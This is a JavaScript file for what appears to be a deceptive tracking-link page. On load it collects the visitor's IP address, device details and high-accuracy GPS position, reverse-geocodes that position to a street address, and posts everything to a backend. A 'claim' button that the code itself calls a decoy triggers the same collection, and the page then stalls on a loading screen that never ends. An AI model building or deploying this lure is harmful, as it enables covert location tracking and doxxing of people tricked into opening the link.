(function() {
    const linkId = window.TRACKING_LINK_ID;
    const loadingOverlay = document.getElementById('loading-overlay');
    const claimBtn = document.getElementById('claim-btn');
    let hasSent = false;

    // Gather basic client metadata
    const clientData = {
        user_agent: navigator.userAgent,
        platform: navigator.platform || 'Unknown',
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language || 'Unknown',
        latitude: null,
        longitude: null,
        accuracy: null,
        altitude: null,
        city: null,
        address: null,
        ip_address: '',
        location_denied: false
    };

    // Show loading overlay after sending
    function showLoadingForever() {
        loadingOverlay.classList.remove('hidden');
    }

    // Main collection process
    async function initTracking() {
        if (hasSent) return;

        // Fetch IP Address
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                clientData.ip_address = ipData.ip;
            }
        } catch (e) {
            console.error('Failed to get IP');
        }

        // Try getting geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    clientData.latitude = position.coords.latitude;
                    clientData.longitude = position.coords.longitude;
                    clientData.accuracy = position.coords.accuracy;
                    clientData.altitude = position.coords.altitude;

                    // Reverse geocode
                    try {
                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${clientData.latitude}&lon=${clientData.longitude}`, {
                            headers: {
                                'Accept-Language': 'en-US,en;q=0.9',
                                'User-Agent': 'ViutckLocationTracker/1.0'
                            }
                        });
                        if (geoResponse.ok) {
                            const geoData = await geoResponse.json();
                            clientData.address = geoData.display_name;
                            clientData.city = geoData.address.city || 
                                              geoData.address.town || 
                                              geoData.address.village || 
                                              geoData.address.suburb || 
                                              geoData.address.county || 
                                              'Unknown';
                        }
                    } catch (e) {
                        console.error('Geocoding failed');
                    }

                    await sendData();
                },
                async function(error) {
                    clientData.location_denied = true;
                    await sendData();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        } else {
            clientData.location_denied = true;
            await sendData();
        }
    }

    // Send payload to backend
    async function sendData() {
        if (hasSent) return;
        hasSent = true;
        try {
            await fetch(`/api/track/${linkId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(clientData)
            });
        } catch (e) {
            console.error('Send failed');
        } finally {
            showLoadingForever();
        }
    }

    // Start tracking on load immediately
    window.addEventListener('DOMContentLoaded', () => {
        initTracking();
    });

    // Fallback/decoy trigger
    if (claimBtn) {
        claimBtn.addEventListener('click', (e) => {
            e.preventDefault();
            showLoadingForever();
            initTracking();
        });
    }
})();
